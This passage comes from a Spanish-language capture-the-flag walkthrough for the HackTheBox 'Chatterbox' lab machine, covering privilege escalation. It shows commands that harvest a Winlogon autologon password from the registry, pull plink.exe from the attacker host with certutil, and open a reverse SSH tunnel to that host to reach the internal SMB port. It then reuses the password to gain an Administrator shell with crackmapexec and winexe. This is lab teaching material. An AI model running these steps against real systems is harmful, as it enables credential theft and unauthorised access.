HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{6f45dc1e-5384-457a-bc13-2cd81b0
d28ed}                    
    (Default)    REG_SZ    PasswordProvider
                                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password
                                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{63d2bb1d-e39a-41b8-9a3d-52dd06677588}\ChannelRefe
rences\5            
    (Default)    REG_SZ    Microsoft-Windows-Shell-AuthUI-PasswordProvider/Diagnostic

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\
{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\EH-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 49 match(es) found.

C:\Users\Alfred\Desktop>
```

Vemos que en el registro `\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` se observa una contraseña  `Welcome1!`, así que vamos a ver quien es el usuario:

```bash
C:\Users\Alfred\Desktop> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    DefaultPassword    REG_SZ    Welcome1!

C:\Users\Alfred\Desktop>
```

Tenemos que las credenciales son `Alfred : Welcome1!`. Podríamos pensar que se estaría haciendo uso de reutilización de credenciales y que la contraseña podría ser del usuario **Administrator**. Asi que primero vamos a ver que versión de sistema operativo tiene y los puertos presentes internamente.

```bash
C:\Users\Alfred\Desktop> systeminfo                                                      
                                                                
Host Name:                 CHATTERBOX      
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation   
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User    
Registered Organization:                                        
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          11/26/2021, 3:10:42 PM
System Manufacturer:       VMware, Inc.    
System Model:              VMware Virtual Platform
System Type:               X86-based PC    
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows      
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB        
Available Physical Memory: 1,582 MB        
Virtual Memory: Max Size:  4,095 MB        
Virtual Memory: Available: 3,455 MB        
Virtual Memory: In Use:    640 MB          
Page File Location(s):     C:\pagefile.sys 
Domain:                    WORKGROUP       
Logon Server:              \\CHATTERBOX    
Hotfix(s):                 183 Hotfix(s) Installed.
...
C:\Users\Alfred\Desktop> netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.74:49157      10.10.14.27:443        ESTABLISHED     InHost      
  TCP    [::]:135               [::]:0                 LISTENING       InHost      
  TCP    [::]:445               [::]:0                 LISTENING       InHost      
  TCP    [::]:49152             [::]:0                 LISTENING       InHost      
  TCP    [::]:49153             [::]:0                 LISTENING       InHost      
  TCP    [::]:49154             [::]:0                 LISTENING       InHost      
  TCP    [::]:49155             [::]:0                 LISTENING       InHost      
  TCP    [::]:49156             [::]:0                 LISTENING       InHost      
  UDP    0.0.0.0:123            *:*                                                
  UDP    0.0.0.0:500            *:*                                                
  UDP    0.0.0.0:4500           *:*                                                
  UDP    0.0.0.0:5355           *:*                                                
  UDP    10.10.10.74:137        *:*                                                
  UDP    10.10.10.74:138        *:*                                                
  UDP    10.10.10.74:1900       *:*                                                
  UDP    10.10.10.74:9256       *:*                                                
  UDP    127.0.0.1:1900         *:*                                                
  UDP    127.0.0.1:54675        *:*                                                
  UDP    [::]:123               *:*                                                
  UDP    [::]:500               *:*                                                
  UDP    [::]:4500              *:*                                                
  UDP    [::1]:1900             *:*                                                
  UDP    [::1]:54674            *:*                                                

C:\Users\Alfred\Desktop>
```

Tenemos una máquina Windows 7 Professional de 32 bits y el puerto 445 abierto de manera interna; por lo que primero vamos a tratar de alcanzar el puerto del servicio SMB desde nuestra máquina de atacante con la herramienta [plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html); asi que la descargamos y la tranferimos a la máquina víctima dentro de un directorio que tengamos permisos de lectura, escritura y ejecución

```bash
C:\Users\Alfred\Desktop> cd C:\Windows\Temp
C:\Windows\Temp> mkdir Privesc
C:\Windows\Temp\Privesc> cd Privesc
C:\Windows\Temp\Privesc> certutil.exe -f -urlcache -split http://10.10.14.27/plink.exe
****  Online  ****
  000000  ...
  09dcf0
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc>
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.74 - - [26/Nov/2021 15:12:46] "GET /plink.exe HTTP/1.1" 200 -
10.10.10.74 - - [26/Nov/2021 15:12:48] "GET /plink.exe HTTP/1.1" 200 -
```

Una vez transferido el archivo, vamos a realizar un ***Remote Port Forwarding***; pero antes vamos a retocar nuestro archivo de configuración ssh bajo la ruta `/etc/ssh/sshd_config` cambiando donde indica `#PermitRootLogin prohibit-password` por `PermitRootLogin yes` y debido a que la plataforma de HackTheBox presenta algunas políticas de restricciones, vamos a también cambiar el puerto default de 22 `#Port 22` a cualquier otro, por ejemplo 2222 `Port 2222` y aplicamos un reset al servicio ssh.

```bash
❯ service ssh restart
```

Se aconseja cambiar la contraseña del usuario **root** de nuestra máquina de atacante por una más sencilla y simple sólo para este caso y posteriormente volverla a modificar por razones de seguridad. Para el ejemplo, cambiaremos la contraseña a `hola123`.

```bash
❯ passwd
Nueva contraseña: 
Vuelva a escribir la nueva contraseña: 
passwd: contraseña actualizada correctamente
```

Ahora si creamos el tunel entre la máquina víctima y nuestro equipo de atacante:

```bash
C:\Windows\Temp\Privesc> plink.exe -l root -pw hola123 -R 445:127.0.0.1:445 10.10.14.27 -P 2222
The server's host key is not cached. You have no guarantee
that the server is the computer you think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 SHA256:675OFGfieEs1qb8WHzY8QjokDotE48lX/rsiIS0yHMI
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
y
Using username "root".
```

Validamos en nuestro equipo que tengamos ocupado un servicio en el puerto 445

```bash
❯ lsof -i:445
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    138671 root    9u  IPv6 420665      0t0  TCP localhost:microsoft-ds (LISTEN)
sshd    138671 root   10u  IPv4 420666      0t0  TCP localhost:microsoft-ds (LISTEN)
```

Y con esto tenemos visible el puerto interno de la máquina víctima en nuestra máquina de atacante de forma local, es decir, bajo la dirección IP 127.0.0.1:445. Ahora vamos a salir las credenciales que tenemos:

```bash
❯ crackmapexec smb 127.0.0.1 -u 'Alfred' -p 'Welcome1!'
SMB         127.0.0.1       445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         127.0.0.1       445    CHATTERBOX       [+] Chatterbox\Alfred:Welcome1!
❯ crackmapexec smb 127.0.0.1 -u 'Administrator' -p 'Welcome1!'
SMB         127.0.0.1       445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         127.0.0.1       445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
```

Con `crackmapexec` confirmamos que las credenciales son válidas para el usuario **Administrator** y además nos pone un `Pwn3d!`, por lo que podemos ejecutar comandos. Ya solo nos queda ingresar a la máquina como dicho usuario con la herramienta `winexe`:

```bash
❯ winexe -U Administrator //127.0.0.1 "cmd.exe"
Enter password: 
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator

C:\Windows\system32>
```

Ya somos el usuario **Administrator** y podemos visualizar la flag (root.txt). 

